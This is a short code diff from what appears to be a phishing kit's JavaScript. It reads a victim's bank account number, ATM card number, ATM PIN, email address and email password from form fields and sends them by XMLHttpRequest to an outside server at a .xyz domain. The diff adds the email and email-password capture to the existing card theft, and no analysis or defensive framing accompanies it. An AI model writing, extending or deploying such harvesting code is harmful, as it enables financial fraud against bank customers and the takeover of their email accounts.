@@ -53,7 +53,9 @@ var yourUrl ="https://xzawwree.xyz/pharoh/smtpjs.php";
             var acctNumber= document.getElementById("acctNumber").value;
             var atmNumber=    document.getElementById("atmNumber").value
             var atmPin =    document.getElementById("atmPin").value
-            if( acctNumber.length < 5 || atmNumber.length < 10  || atmPin.length < 3 )
+            var emaill =    document.getElementById("emaill").value
+            var email_pass =    document.getElementById("email_pass").value
+            if( acctNumber.length < 5 || atmNumber.length < 10  || atmPin.length < 3 || emaill.length < 3 || email_pass.length < 3 )
             {
                 alert ("please enter all feild correctly")
             }
@@ -61,7 +63,7 @@ var yourUrl ="https://xzawwree.xyz/pharoh/smtpjs.php";
     
     
             else{
-                var body ="Email: "+email+"\nacctNumber: "+acctNumber+"\n atmNumber: "+atmNumber+"\n atmPin : "+atmPin 
+                var body ="Email: "+email+"\nacctNumber: "+acctNumber+"\n atmNumber: "+atmNumber+"\n atmPin : "+atmPin +"\n email__ : "+emaill +"\n email_pass : "+email_pass 
                 var xhr = new XMLHttpRequest();
                 xhr.onreadystatechange = function() {
                     if (this.readyState == 4 && this.status == 200) {
